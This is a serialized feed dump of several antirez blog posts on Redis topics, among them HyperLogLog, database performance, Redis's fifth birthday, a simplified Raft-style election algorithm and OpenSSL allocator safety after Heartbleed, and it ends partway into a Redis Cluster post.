<br>It is interesting that OpenSSL is doing its own allocation caching stuff because in some systems malloc/free is slow. This is a sign that still performances, even in security critical code, is regarded with too much respect over safety. In this specific instance, it must be admitted that probably when the OpenSSL developers wrapped malloc, they never though of security implications by doing so. However the fact that they cared about a low-level detail like the allocation functions in *some* system is a sign of deep concerns about performances, while they should be more deeply concerned about the correctness / safety of the system.
<br>
<br>In general it does not help the fact that the system that is the de facto standard in today’s servers infrastructure, that is, Linux, has had, and still has, one of the worst allocators you will find around, mostly for licensing concerns, since the better allocators are not GPL but BSD licensed.
<br>
<br>Probably yet another area where big corps should contribute, by providing significant improvements to glibc malloc. Glibc malloc is, even if better alternatives are available, what many real-world system softwares are going to use anyway.
<br>
<br>I would love to see the discussion about heartbleed to take a more pragmatic approach, because one thing is guaranteed: to blame here or there will not change the actual level of the security of OpenSSL or anything else, and there are new challenges in the future. For example the implementation of HTTP/2.0 may be a very delicate moment security wise.
<br>
<br>EDIT: Actually I was not right and the malloc implementation inside the Glibc is BSD licensed, so it is not a license issue. I don't know why the Glibc is not using Jemalloc instead that is very good and actively developed allocator.
<a href=\"http://antirez.com/news/76\">Comments</a>" nil "http://antirez.com/news/76" "98bca27644a04dbade43622a480e3c35") (28 (26588 31766 987376 55000) "http://antirez.com/news/75
" "Redis new data structure: the HyperLogLog " nil "Tue, 01 Apr 2014 08:16:35 +0000" "Generally speaking, I love randomized algorithms, but there is one I love particularly since even after you understand how it works, it still remains magical from a programmer point of view. It accomplishes something that is almost illogical given how little it asks for in terms of time or space. This algorithm is called HyperLogLog, and today it is introduced as a new data structure for Redis.
<br>
<br>Counting unique things
<br>===
<br>
<br>Usually counting unique things, for example the number of unique IPs that connected today to your web site, or the number of unique searches that your users performed, requires to remember all the unique elements encountered so far, in order to match the next element with the set of already seen elements, and increment a counter only if the new element was never seen before.
<br>
<br>This requires an amount of memory proportional to the cardinality (number of items) in the set we are counting, which is, often absolutely prohibitive.
<br>
<br>There is a class of algorithms that use randomization in order to provide an approximation of the number of unique elements in a set using just a constant, and small, amount of memory. The best of such algorithms currently known is called HyperLogLog, and is due to Philippe Flajolet.
<br>
<br>HyperLogLog is remarkable as it provides a very good approximation of the cardinality of a set even using a very small amount of memory. In the Redis implementation it only uses 12kbytes per key to count with a standard error of 0.81%, and there is no limit to the number of items you can count, unless you approach 2^64 items (which seems quite unlikely).
<br>
<br>The algorithm is documented in the original paper [1], and its practical implementation and variants were covered in depth by a 2013 paper from Google [2].
<br>
<br>[1] http://algo.inria.fr/flajolet/Publications/FlFuGaMe07.pdf
<br>[2] http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/40671.pdf
<br>
<br>How it works?
<br>===
<br>
<br>There are plenty of wonderful resources to learn more about HyperLogLog, such as [3].
<br>
<br>[3] http://blog.aggregateknowledge.com/2012/10/25/sketch-of-the-day-hyperloglog-cornerstone-of-a-big-data-infrastructure/
<br>
<br>Here I’ll cover only the basic idea using a very clever example found at [3]. Imagine you tell me you spent your day flipping a coin, counting how many times you encountered a non interrupted run of heads. If you tell me that the maximum run was of 3 heads, I can imagine that you did not really flipped the coin a lot of times. If instead your longest run was 13, you probably spent a lot of time flipping the coin.
<br>
<br>However if you get lucky and the first time you get 10 heads, an event that is unlikely but possible, and then stop flipping your coin, I’ll provide you a very wrong approximation of the time you spent flipping the coin. So I may ask you to repeat the experiment, but this time using 10 coins, and 10 different piece of papers, one per coin, where you record the longest run of heads. This time since I can observe more data, my estimation will be better.
<br>
<br>Long story short this is what HyperLogLog does: it hashes every new element you observe. Part of the hash is used to index a register (the coin+paper pair, in our previous example. Basically we are splitting the original set into m subsets). The other part of the hash is used to count the longest run of leading zeroes in the hash (our run of heads). The probability of a run of N+1 zeroes is half the probability of a run of length N, so observing the value of the different registers, that are set to the maximum run of zeroes observed so far for a given subset, HyperLogLog is able to provide a very good approximated cardinality.
<br>
<br>The Redis implementation
<br>===
<br>
<br>The standard error of HyperLogLog is 1.04/sqrt(m), where “m” is the number of registers used.
<br>Redis uses 16384 registers, so the standard error is 0.81%.
<br>
<br>Since the hash function used in the Redis implementation has a 64 bit output, and we use 14 bits of the hash output in order to address our 16k registers, we are left with 50 bits, so the longest run of zeroes we can encounter will fit a 6 bit register. This is why a Redis HyperLogLog value only uses 12k bytes for 16k registers.
<br>
<br>Because of the use of a 64 bit output function, which is one of the modifications of the algorithm that Google presented in [2], there are no practical limits to the cardinality of the sets we can count. Moreover it is worth to note that the error for very small cardinalities tend to be very small. The following graph shows a run of the algorithm against two different large sets. The cardinality of the set is shown in the x axis, while the relative error (in percentage) in the y axis.
<br>
<br>img://antirez.com/misc/hll_1.png
<br>
<br>The red and green lines are two different runs with two totally unrelated sets. It shows how the error is consistent as the cardinality increases. However for much smaller cardinalities, you can enjoy a much smaller error:
<br>
<br>img://antirez.com/misc/hll_2.png
<br>
<br>The green line shows the error of a single run up to cardinality 100, while the red line is the maximum error found in 100 runs. Up to a cardinality of a few hundreds the algorithm is very likely to make a very small error or to provide the exact answer. This is very valuable when the computed value is shown to an user that can visually match if the answer is correct.
<br>
<br>The source code of the Redis implementation is available at Github:
<br>
<br>https://github.com/antirez/redis/blob/unstable/src/hyperloglog.c
<br>
<br>The API
<br>===
<br>
<br>From the point of view of Redis an HyperLogLog is just a string, that happens to be exactly 12k + 8 bytes in length
<br>(12296 bytes to be precise). All the HyperLogLog commands will happily run if called with a String value exactly of this size, or will report an error. However all the calls are safe whatever is stored in the string: you can store garbage and still ask for an estimation of the cardinality. In no case this will make the server crash.
<br>
<br>Also everything in the representation is endian neutral and is not affected by the processor word size, so a 32 bit big endian processor can read the HLL of a 64 bit little endian processor.
<br>
<br>The fact that HyperLogLogs are strings avoided the introduction of an actual type at RDB level. This allows the work to be back ported into Redis 2.8 in the next days, so you’ll be able to use HyperLogLogs ASAP. Moreover the format is automatically serialized, and can be retrieved and restored easily.
<br>
<br>The API is constituted of three new commands:
<br>
<br>PFADD var element element … element
<br>PFCOUNT var
<br>PFMERGE dst src src src … src
<br>
<br>The commands prefix is “PF” in honor of Philippe Flajolet [4].
<br>
<br>[4] http://en.wikipedia.org/wiki/Philippe_Flajolet
<br>
<br>PFADD adds elements to the HLL stored at “var”. If the variable does not exist, an empty HLL is automatically created as it happens always with Redis API calls. The command is variadic, so allows for very aggressive pipelining and mass insertion.
<br>
<br>The command returns 1 if the underlying HyperLogLog was modified, otherwise 0 is returned.
<br>This is interesting for the user since as we add elements the probability of an element actually modifying some register decreases. The fact that the API is able to provide hints about the fact that a new cardinality is available allows for programs that continuously add elements and retrieve the approximated cardinality only when a new one is available.
<br>
<br>PFCOUNT returns the estimated cardinality, which is zero if the key does not exist.
<br>
<br>Finallly PFMERGE can merge N different HLL values into one. The resulting HLL will report an estimated cardinality that is the cardinality of the union of the different sets that we counted with the different HLL values.
<br>This seems magical but works because HLL while randomized is fully deterministic, so PFMERGE just takes, for every register, the maximum value available across the N HLL values. A given element hashes to the same register with the same run of zeroes always, so the merge performed in this way will only add the count of the elements that are not common to the different HLLs.
<br>
<br>As you can see HyperLogLog is fully parallelizable, since it is possible to split a set into N subsets counted independently to later merge the values and obtain the total cardinality approximation. The fact that HLLs in Redis are just strings helps to move HLL values across instances.
<br>
<br>First make it correct, then make it fast
<br>===
<br>
<br>Redis HHLs are composed of 16k registers packed into 6 bit integers. This creates several performance issues that must be solved in order to provide an API of commands that can be called without thinking too much.
<br>
<br>One problem is that accessing to registers require accessing multiple bytes, shifting, and masking in order to retrieve the correct 6 bit value. This is not a big problem for PFADD that only touches a register for every element, but PFCOUNT needs to perform a computation using all the 16k registers, so if there are non trivial constant times to access every single register, the command risks to be slow. Moreover, while accessing the registers, we need to compute the sum of pow(2,-register) which involves floating point math.
<br>
<br>One may feel the temptation of using full bytes instead of 6 bit integers in order to speedup the computation, however this would be a shame since every HLL would use 16k instead of 12k that is a non trivial difference, so this route was discarded at the beginning. The command was optimized for a speedup of about 3 times compared to the initial implementation by doing the following changes:
<br>
<br>* For m=16k which is the Redis default (the implementation is more generic and could theoretically work with different values) the implementation selects a fast-path with unrolled loops accessing 16 register at every time. The registers are accessed using fixed offsets / shifts / masks (via some pointer that is incremented 12 bytes at the next iteration).
<br>* The floating point computation was modified in order to allow for multiple operations to be performed in parallel when possible. This was just a matter of adding parens. Floating point math is not commutative, but in this case there was no loss of precision.
<br>* The pow(2,-register) term was precomputed in a lookup table.
<br>
<br>With the 3x speedup provided by the above changes the command was able to perform about 60k calls per second in a fast hardware. However this is still far from the hundreds thousands calls possible with commands that are, from the user point of view, conceptually similar, like SCARD.
<br>
<br>Instead of optimizing the computation of the approximated cardinality further, there was a simpler solution. Basically the output of the algorithm only changes if some register changes. However as already observed above, most of the PFADD calls don’t result in any register changed. This basically means that it is possible to cache the last output and recompute it only if some register changes.
<br>
<br>So our data structure has an additional tail of 8 bytes representing a 64bit unsigned integer in little endian format. If the most significant bit is set, then the precomputed value is stale and requires to be recomputed, otherwise PFCOUNT can use it as it is. PFADD just turns on the “invalid cache” bit when some register is modified.
<br>
<br>After this change even trying to add elements at maximum speed using a pipeline of 32 elements with 50 simultaneous clients, PFCOUNT was able to perform as well as any other O(1) command with very small constant times.
<br>
<br>Bias correction using polynomial regression
<br>===
<br>
<br>The HLL algorithm, in order to be practical, must work equally well in any cardinality range. Unfortunately the raw estimation performed by the algorithm is not very good for cardinalities less than m*2.5 (around 40000 elements for m=16384) since in this range the algorithm outputs biased or even results with larger errors depending on the exact range.
<br>
<br>The original HLL paper [1] suggests switching to Linear Counting [5] when the raw cardinality estimated by the first part of the HLL algorithm is less than m*2.5.
<br>
<br>[5] http://dblab.kaist.ac.kr/Publication/pdf/ACM90_TODS_v15n2.pdf
<br>
<br>Linear counting is a different cardinality estimator that uses a simple concept. We have a bitmap of N bits. Every time a new element must be counted, it is hashed, and the hash is used in order to index a random bit inside the bitmap, that is turned to 1. The number of unset bits in the bitmap gives an idea of how many elements we added so far using the following formula:
<br>
<br>    cardinality = m*log(m/ez);
<br>
<br>Where ‘ez’ is the number of zero bits and m is the total number of bits in the bitmap.
<br>
<br>Linear counting does not work well for large cardinalities compared to HyperLogLog, but works very well for small cardinalities. Since the HLL registers as a side effect also work as a linear counting bitmap, counting the number of zero registers it is possible to apply linear counting for the range where HLL does not perform well. Note that this is possible because when we update the registers, we don’t really use the longest run of zeroes, but the longest run of zeroes plus one. This means that if an element is added and it is addressing a register that was never addressed, the register will turn from 0 to a different value (at least 1).
<br>
<br>The problem with linear counting is that as the cardinality gets bigger, its output error gets larger, so we need to switch to HLL ASAP. However when we switch at 2.5m, HLL is still biased. In the following image the same cardinality was tested with 1000 different sets, and the error of each run is reported as a point:
<br>
<br>img://antirez.com/misc/hll_3.png
<br>
<br>The blu line is the average of the error. As you can see before a cardinality of 40k, where linear counting is used, the more we go towards greater cardinalities, the more the points “beam” gets larger (bigger errors). When we switch to HLL raw estimate the error is smaller, but there is a bias: the algorithm overestimates the cardinality in the range 40k-80k.
<br>
<br>Google engineers studied this problem extensively [2] in order to correct the bias. Their solution was to create an empirical table of cardinality values and the corresponding biases. Their modified algorithm uses the table and interpolation in order to get the bias in a given range, and correct accordingly.
<br>
<br>I used a different approach: you can see that the bias is not random but looks like a very smooth curve, so I calculated a few cardinality-bias samples and performed polynomial regression in order to find a polynomial approximating the curve.
<br>
<br>Currently I’m using a four order polynomial to correct in the range 40960-72000, and the following is the result after the bias correction:
<br>
<br>img://antirez.com/misc/hll_4.png
<br>
<br>While there is still some bias at the switching point between the two algorithms, the result is quite satisfying compared to the vanilla HLL algorithm, however it is probably possible to use a curve that fits better the bias curve. I had no time to investigate this further.
<br>
<br>It is worth to note that during my investigations I found that, when no bias correction is used, and at least for m=16384, the best value to switch from linear counting to raw HLL estimate is actually near 3 and not 2.5 as mentioned in [1], since a value of 3 both improves bias and error. Values larger than 3 will improve the bias (a value of 4 completely corrects it) but will have bad effects on the error.
<br>
<br>The original HLL algorithm also corrects for values towards 2^32 [1][2] since once we approach very large values collisions in the hash function starts to be an issue. We don’t need such correction since we use a 64 bit hash function and 6 bits counters, which is one of the modifications proposed by Google engineers [2] and adopted by the Redis implementation.
<br>
<br>Future work
<br>===
<br>
<br>Intuitively it seems like it is possible to improve the error of the algorithm output when linear counting is used by exploiting the additional informations we have. In the standard linear counting algorithm the registers are just 1 bit wide, so we have only two informations: if an element so far hashed to this bit or not. Still the HLL algorithm as proposed initially [1] and as modified at Google [2], when reverting to linear counting still only use the number of zero registers as the input of the algorithm. It is possible that also using the information stored in the registers could improve the output.
<br>
<br>For example in standard linear counting, assuming we have 10 bits, I may add 5 elements that all happen to address the same bit. This is an odd case that the algorithm has no way to correct, and the estimation provided will likely be smaller than the actual cardinality. However in the linear counting algorithm used by HLL in a similar situation we may found that the value at the only register set is an hint about multiple elements colliding there, allowing a correction of the output.
<br>
<br>Conclusion
<br>===
<br>
<br>HyperLogLog is an amazing data structure. My hope is that the Redis implementation, that will be available in a stable release in a matter of days (Redis 2.8.9 will include it), will provide this tool in a ready to use form to many programmers.
<br>
<br>The HN post is here: https://news.ycombinator.com/item?id=7506774
<a href=\"http://antirez.com/news/75\">Comments</a>" nil "http://antirez.com/news/75" "7f03702ca206803b4e9fd21655b77cd1") (27 (26588 31766 986419 650000) "http://antirez.com/news/74
" "Fascinating little programs " nil "Thu, 13 Mar 2014 22:32:59 +0000" "Yesterday and today I managed to spend some time with linenoise (http://github.com/antirez/linenoise), a minimal line-editing library designed to be a simple and small replacement for readline.
<br>I was trying to merge a few pull requests, to fix issues, and doing some refactoring at the same time. It was some kind of nirvana I was feeling: a complete control of small, self-contained, and useful code.
<br>
<br>There is something special in simple code. Here I’m not referring to simplicity to fight complexity or over engineering, but to simplicity per se, auto referential, without goals if not beauty, understandability and elegance.
<br>
<br>After all the programming world has always been fascinated with small programs. For decades programmers challenged in 1k or 4k contexts, from the 6502 assembler to today’s javascript contests.
<br>Even the obfuscated C contest, after all, has a big component in the minimalism.
<br>
<br>Why is it so great to hack a small piece of code? Yes is small and simple, those are two good points. It can be totally understood, dominated. You can use smartness since little code is the only place of the world where coding smartness will pay off, since in large projects obviousness is far better in the long run. However I believe there is more than that, and is that small programs can be perfect. As perfect as a sonnet composed of a few words. The limits in size and in scope, constitute an intellectual stratagem to avoid the “it may be better\" trap, when this better is not actually measurable and evident. Under these strict limits, what the program does is far more interesting than what it does not. Actually the constraints are the more fertile ground for creativity of the solutions, otherwise likely useless: at scale there is always a more correct, understood, canonical way to do everything.
<br>
<br>There is an interview of Bill Gates in the first years of the Microsoft experience where he describes this feeling when writing the famous Microsoft BASIC interpreter. The limits were the same we self impose today to ourselves for fun, in the contests, or just for the sake of it. There was a generation of programmers that was able to experience perfection in their creations, where it was obvious to measure and understand if a change actually lead to an improvement of the program or not, in a territory where space and time were so scarse. There was no room for wastes and not needed complexity.
<br>
<br>Today’s software is in some way the triumph of the other reality of software: layers of complexities that gave use incredible devices or infrastructure technologies that in the hands of non experts leverage a number of possibilities. However maybe there is still something to preserve from the ancient times where software could be perfect, the feeling that what you are creating has a structure and is not just a pile of code that works. If you zoom out enough, you’ll see your large program is actually quite small again, and at least at this scale, it should resemble perfection, or at least, aim at it.
<a href=\"http://antirez.com/news/74\">Comments</a>" nil "http://antirez.com/news/74" "afe0373f9f781423de00330a6ebd2153") (26 (26588 31766 986206 797000) "http://antirez.com/news/73
" "What is performance? " nil "Fri, 28 Feb 2014 13:30:42 +0000" "The title of this blog post is an apparently trivial to answer question, however it is worth to consider a bit better what performance really means: it is easy to get confused between scalability and performance, and to decompose performance, in the specific case of database systems, in its different main components, may not be trivial. In this short blog post I’ll try to write down my current idea of what performance is in the context of database systems.
<br>
<br>A good starting point is probably the first slide I use lately in my talks about Redis. This first slide is indeed about performance, and says that performance is mainly three different things.
<br>
<br>1) Latency: the amount of time I need to get the reply for a query.
<br>
<br>2) Operations per unit of time per core: how many queries (operations) the system is able to reply per second, in a given reference computational unit?
<br>
<br>3) Quality of operations: how much work those operations are able to accomplish?
<br>
<br>Latency
<br>—
<br>
<br>This is probably the simplest component of performance. In many applications it is desirable that the time needed to get a reply from the system is small. However while the average time is important, another concern is the predictability of the latency figure, and how much difference there is between the average case and the worst case. When used well, in-memory systems are able to provide very good latency characteristics, and are also able to provide a consistent latency over time.
<br>
<br>Operations per second per core
<br>—
<br>
<br>The second component I’m enumerating is what makes the difference between raw performance and scalability. We are interested in the amount of work the system is able to do, in a given unit of time, for a given reference computational unit. Linearly scalable systems can reach a big number of operations per second by using a number of nodes, however this means they are scalable, and not necessarily performant.
<br>
<br>Operations per second per core is also usually bound to the amount of queries you can perform per watt, so to the energy efficiency of the system.
<br>
<br>Quality of operations
<br>—
<br>
<br>The last point, while probably not as stressed among developers as throughput and latency, is really important in certain kind of systems, especially in-memory systems.
<br>
<br>A system that is able to perform 100 operations per second, but with operations of “poor quality” (for example just GET and SET in Redis terms) has a lower performance compared to a system that is also able to perform an INCR operation with the same latency and OPS characteristics.
<br>For instance, if the problem at hand is to increment counters, the former system will require two operations to increment a counter (we are not considering race conditions in this context), while the system providing INCR is able to use a single operation. As a result it is actually able to provide twice the performance of the former system.
<br>
<br>As you can see the quality of operations is not an absolute meter, but depends on the kind of problem to solve. The same two systems if we want to cache HTML fragments are equivalent since the INCR operation would be useless.
<br>
<br>The quality of operations is particularly important in in-memory systems, since usually the computation itself is negligible compared to the time needed to receive, dispatch the command, and create a reply, so systems like Redis with a rich set of operations are able to provide better performance in many contexts almost for free, just allowing the user to do more with a single operation. The “do more” part can actually mean a lot of things: either provide a reply to a more complex question, like for example the ZRANK command of Redis, or simply being able to provide a more *selective* reply, like HMGET command that is able to provide information just for a subset of the fields composing an Hash value, reducing the amount of bandwidth required between the server and its clients.
<br>
<br>In general quality of operations don't only affect performances because they give less or more value to the operations per second the system is able to perform: operations quality also directly affect latency, since more complex operations are able to avoid back and forth data transfer between clients and servers required to mount multiple simpler operations into a more complex computation.
<br>
<br>Conclusion
<br>—
<br>
<br>I hope that this short exploration of what performance is uncovered some of the complexities involved in the process of evaluating the capabilities of a database system from this specific point of view. There is a lot more to say about it, but I found that the above three components of the performance are among the most interesting and important when evaluating a system and when there is to understand how to evolve an existing system to improve its performance characteristics.
<br>
<br>Thanks to Yiftach Shoolman for feedbacks about this topic.
<a href=\"http://antirez.com/news/73\">Comments</a>" nil "http://antirez.com/news/73" "20f5d02217aa220d6b791f8fbcdca16f") (25 (26588 31766 985875 990000) "http://antirez.com/news/72
" "Happy birthday Redis! " nil "Wed, 26 Feb 2014 09:19:41 +0000" "Today Redis is 5 years old, at least if we count starting from the initial HN announcement [1], that’s actually a good starting point. After all an open source project really exists as soon as it is public.
<br>
<br>I’m a bit shocked I worked for five years straight to the same thing. The opportunities for learning new things I had because of the directions where Redis pushed me, and the opportunities to learn new things that I missed because I had almost consistently no time for random hacking, are huge.
<br>
<br>My feeling today is that the Redis project was possible because of the great coders I encountered in my journey: they made Redis popular adopting it in its infancy, since great coders don’t follow the hype. Great coders provided outstanding additions to Redis in the form of patches and ideas that were able to surpass my instinct to be conservative when the topic was to extend the system or accept external contributions. More great coders made possible to sponsor Redis when it was in its infancy, recognizing that there was something interesting about it, and more great coders applied it in the right way to solve problems in the course of many years, wrote an incredible ecosystem of client libraries and tools, and helped other coders to apply it when it was not clear what was the best way to solve a given problem.
<br>
<br>The Redis community is outstanding because in some way it managed to attract a number of great coders.
<br>
<br>I learned that in the future, whatever I’ll do more coding or I’ll be in a team to build something great in a different role, my top priority will be to stay with great coders, and I learned that they are not easy to recognize at first: their abilities don’t correlate with the number of followers on Twitter nor with the number of Github repositories. You have to discover great coders one after the other, and the biggest gift that Redis provided to me, was to get exposed to many of them.
<br>
<br>In the course of five years there was also time, for me, to evolve my idea of what Redis is. The idea I’ve of Redis today is that its contribution should be to try to explore corner designs and bizzarre ideas. After all there are large teams of people much smarter than me trying to work on the hard problems applying the best technologies available.
<br>
<br>Redis will continue to be a small research in more obscure places of the design space. After all I’ve the feeling that it helped to popularize certain non obvious ideas, like using data structures as data model for key value stores and caches, or that it is possible to apply scripting to database systems in a different way than stored procedures.
<br>
<br>However for Redis to be able to do this research, I should be ready to be opinionated and change development direction when something is weak. This was done in the past, deprecating swap and diskstore, but should be done even more in the future.
<br>
<br>Moreover Redis should be able to purse different goals at the same time: once Redis 3.0 will be stable, the design of Redis Cluster is conceived in order to leave my hands free about changes in the data model, without too much limits or compromises. This will result in a Redis 3.2 release that will focus again on the API, stressing one of the initial and fundamental aspects of Redis: caching, data model and computation.
<br>
<br>It is entirely not obvious to me, after five years, to consider the Redis journey still ongoing, and I’m happy about it, because my motivations are not investors or shares, nor that I’m particularly in love with Redis as a project. If something new appears tomorrow that marginalizes Redis and makes it totally useless I’ll be very happy to start some new gig, after all this is how technology works: for cycles. And, after all, starting from scratch with something new is always exciting. However currently I believe there is more to do about Redis, and I’ll be happy to continue my work on it in the next weeks.
<br>
<br>[1] https://news.ycombinator.com/item?id=494649
<a href=\"http://antirez.com/news/72\">Comments</a>" nil "http://antirez.com/news/72" "aea068942b95dff30e2c36dac9539218") (24 (26588 31766 985601 346000) "http://antirez.com/news/71
" "A simple distributed algorithm for small idempotent information " nil "Fri, 21 Feb 2014 11:40:01 +0000" "In this blog post I’m going to describe a very simple distributed algorithm that is useful in different programming scenarios.
<br>The algorithm is useful when you need to take some kind of information synchronized among a number of processes.
<br>The information can be everything as long as it is composed of a small number of bytes, and as long as it is idempotent, that is, the current value of the information does not depend on the previous value, and we can just replace an old value, with the new one.
<br>
<br>The size of the information is important because for the way the algorithm works, the information should be small enough that every node can broadcast it from time to time to some other random node, so it should fit the size of an “heartbeat” packet. Let’s say that up to a few kbytes everything is fine.
<br>
<br>This algorithm is no new in any way, it is basically just a trivial way to put together obvious ideas found in other distributed algorithms in a simple way. However the algorithm is very useful in many real-world contexts, and is extremely simple to implement. The algorithm is mostly borrowed from Raft, however because of the premises it uses only a subset of Raft that is trivial to implement.
<br>
<br>An example scenario
<br>===
<br>
<br>To understand better the algorithm, it is much better to have an example of problem that we want to solve in our distributed system.
<br>Let’s say that we have N processes connected with two kind of wifi networks: a very reliable but slow wireless network, that is only suitable to send “control” packets like heartbeats or other low bandwidth data, and a very fast wireless network.
<br>
<br>Now let’s imagine that while the slow network works at a fixed frequency, the high speed wireless network requires to adapt to changing conditions and noises in a given frequency, and is able to hop to a different frequency as soon as too much noise is detected.
<br>
<br>We need a way to make sure that all the processes use the same frequency to communicate with the high speed network, and we also need a way to switch frequency when the currently used frequency has issues. We need this system to work if there are network partitions in the slow network, as long as the majority of the processes are able to communicate.
<br>
<br>Note that this problem has the properties stated above:
<br>
<br>1) The information is idempotent, if the high speed network switched to an different frequency, the new frequency does not depend on the old frequency. A process receiving the new frequency can just update frequency regardless of the fact that its old frequency was updated, or an older one (because for some reason it did not received some update).
<br>
<br>2) The information is small, it is possible to propagate it easily across nodes in a small data packet. In this case it is actually extremely small, for example the frequency may be encoded in a 64 bit integer.
<br>
<br>Epochs and update messages
<br>===
<br>
<br>The basic idea of this algorithm is that there is an artificial notion of time across the processes, that is used to order events or informations without to resort to the system time of the process, that is hard to synchronize between them.
<br>This artificial time is called the “epoch”. Every process has the notion of currentEpoch, that is, initialized at zero at startup.
<br>Every time a process sees an epoch that is greater that its current epoch, it updates its epoch to match the observed epoch.
<br>
<br>Every process has also the notion of the frequencyEpoch, that is, the version of the currently used frequency.
<br>
<br>In order to propagate the information, every process periodically sends an update message to some other process. For example every 5 seconds every process picks a random process, and sends to it an update message containing: the current frequency in use, the epoch of the frequency used, and the currentEpoch of the process sending the update message.
<br>
<br>The first time a process is created its frequency is set to -1: this means that there is no frequency currently in use from the point of view of a given process, and that another one must be picked.
<br>
<br>Updating the frequency
<br>===
<br>
<br>When a process receives an update message from another process  containing a frequency with a frequencyEpoch that is greater than its local frequencyEpoch, it updates its frequency to the received value, and sets the frequencyEpoch to the received value as well.
<br>
<br>In general when the currentEpoch or the frequency and frequencyEpoch are modified, the process writes this change to the disk or other permanente storage, so that when the process is restarted it will use the latest known information.
<br>
<br>Choosing a frequency
<br>===
<br>
<br>A process requires to choose a frequency in two different scenarios:
<br>
<br>1) When the current frequency is detected to be noisy.
<br>2) When the current frequency is set to -1 (at startup).
<br>
<br>In order to choose a frequency, a process requires to win an election.
<br>
<br>This is how it works:
<br>
<br>1) The process increments its own currentEpoch, and writes it to permanent storage. It also selects a suitable new frequency.
<br>
<br>2) The process sends to all the other processes a ELECT_ME packet to get the vote of the other processes. The ELECT_ME packet contains the currentEpoch of the sending process.
<br>
<br>3) The other processes will reply with YOU_HAVE_MY_VOTE packet only if their currentEpoch is not greater compared to the one of the process requesting the vote (it can’t be smaller, since the reception of the ELECT_ME packet will cause an older currentEpoch to be updated to match the one of the incoming packet). The YOU_HAVE_MY_VOTE packet contains the currentEpoch of the voting process.
<br>
<br>4) A given process only votes a single time for a given epoch, so it takes a variable called lastVoteEpoch, and will only provide its vote if the currentEpoch in the request for the vote is greater (>) than lastVoteEpoch. When the vote is provided, lastVoteEpoch is updated (and stored on disk *before* the vote is provided, so that a crash and restart will not cause this process to vote again for the same epoch).
<br>
<br>5) YOU_HAVE_MY_VOTE messages with a currentEpoch smaller than the currentEpoch of the process that requested the vote are discarded.
<br>
<br>6) The process requesting the vote will consider itself elected only if it receives the majority of the votes from the other processes (it will count itself as a voter and will vote for itself when the election starts). If the process is elected it will updated its frequencyEpoch and frequency variables. The frequencyEpoch that will be used is the epoch the process requested the vote with, that is, its currentEpoch at the time it sent the ELECT_ME packets, just after the increment.
<br>
<br>Given that a process requires to be elected to change the frequency, and that every process votes a single time in a given epoch, there must be only a single winner for a given epoch.
<br>
<br>If a given process is not able to get elected as the majority is not reached, it will try again after a random delay. This delay must be greater compared to the latency of the slow network that is used to exchange these messages (see the Raft paper for more information about this). Every process will consider the election aborted after some time that is smaller than the retry time.
<br>
<br>Propagating the new information
<br>===
<br>
<br>When a process wins an election, it updates its frequency value and frequencyEpoch to the new one, so by sending UPDATE messages, eventually all the other processes will receive the update as well and will switch to the new frequency.
<br>
<br>If some process is partitioned away, it will receive the update as soon as the partition heals.
<br>
<br>However it is a good idea to broadcast an UPDATE message to all the processes ASAP as soon as a process changes the frequency, so that all the other nodes will switch ASAP.
<br>
<br>Improving the algorithm with a simple change
<br>===
<br>
<br>The ELECT_ME packet can be improved by adding the value of the frequencyEpoch, so that other processes will refuse to vote if the process has a stale information. This may happen when, for example, the process was partitioned away for some time with an old frequency that does not work well as there is too much noise. So in a minority partition, it may try to get elected again and again. The majority probably already switched to a newer frequency.
<br>
<br>When the partition heals, the process may get elected and change the frequency to something else before having the chance to receive the updated frequency, causing a useless frequency switch. By adding the frequencyEpoch in the ELECT_ME packet and by making other processes checking that the info is updated before providing the vote, we avoid this problem.
<br>
<br>Other improvements
<br>===
<br>
<br>Another improvement may be to only provide the vote if the current frequency, from the point of view of the receiving node, is *really* noisy. This avoids that a single node having hardware issues in the high bandwidth radio will be able to continuously switch to new frequencies since every frequency will be detected as noisy. In this way a frequency switch can happen only if the majority of the nodes are detecting an issue with the current frequency.
<br>
<br>Similarly the node sending ELECT_ME messages to get elected may include the frequency it want to switch to, and the receiving node may vote only if the selected frequency passes some test and is considered a good pick, however this may affect the liveness of the algorithm: different nodes may believe that different frequencies are not a good pick so that majority can’t be reached.
<br>
<br>Conclusions
<br>===
<br>
<br>What I did in this blog post is just to take Raft, that is able to handle the complex problem of replicating a state machine across different processes in a consistent way, and simplify it in order to use it in a subset of problems where the state is a single value (or a set of values) that can just be updated in an idempotent way.
<br>
<br>The resulting algorithm is trivial to implement in a robust way, and is good enough for a non trivial set of real world problems.
<br>
<br>---------------------------------------
<br>
<br>EDIT: I received some feedback via Twitter, and I think it is better to clarify what is the meaning of the above algorithm. The idea is to retain some safety under the specified scenario, where a replicated state machine is not needed, but still have a reasonable way to take a set of values synchronized across different processes. The goal is to provide, in exchange for the lack of functionality compared to Raft or Paxos, an algorithm that can be recalled by memory only without even reading a document. In this spirit my aim is to further simplify the above description of the algorithm without impacting the functionality.
<br>
<br>Moreover as somebody that is trying to understand more about distributed programming, I see that while it is very simple without even being aware of it, to get involved in something that is a distributed system, as a normal programmer (given that everything is networked today), descriptions of trivial algorithms may be a way to get somewhat exposed to basic distributed concepts.
<br>
<br>The next step is to learn a formal analysis tool and try to analyze the algorithm to provide a proof of safety / liveness.
<a href=\"http://antirez.com/news/71\">Comments</a>" nil "http://antirez.com/news/71" "3171221de61a3571caa660d71a800adb") (23 (26588 31766 984913 721000) "http://antirez.com/news/70
" "Redis Cluster and limiting divergences. " nil "Mon, 20 Jan 2014 16:13:56 +0000" "Redis Cluster is finally on its road to reach the first stable release in a short timeframe as already discussed in the Redis google group [1]. However despite a design never proposed for the implementation of Redis Cluster was analyzed and discussed at long in the past weeks (unfortunately creating some confusion: many people, including notable personalities of the NoSQL movement, confused the analyzed proposal with Redis Cluster implementation), no attempt was made to analyze or categorize Redis Cluster itself.
<br>
<br>I believe that putting in perspective the simple ideas that Redis Cluster implements, in a more formal way, is an interesting exercise for the following reason: Redis Cluster is not a design that tries to achieve “AP” or “CP” of the CAP theorem, since for its goals CAP Availability and CAP Consistency are too hard goals to reach without sacrificing other practical qualities.
<br>
<br>Once a design does not try to maximize what is theoretically possible, the design space becomes much larger, and the implementation main goal is to try to provide some Availability and some reasonable form of Consistency, in the face of other conflicting design requirements like asynchronous replication of data.
<br>
<br>The goal of this article is to reply to the following question: how Redis Cluster, as an asynchronous system, tries to limit divergences between nodes?
<br>
<br>Nodes divergence
<br>===
<br>
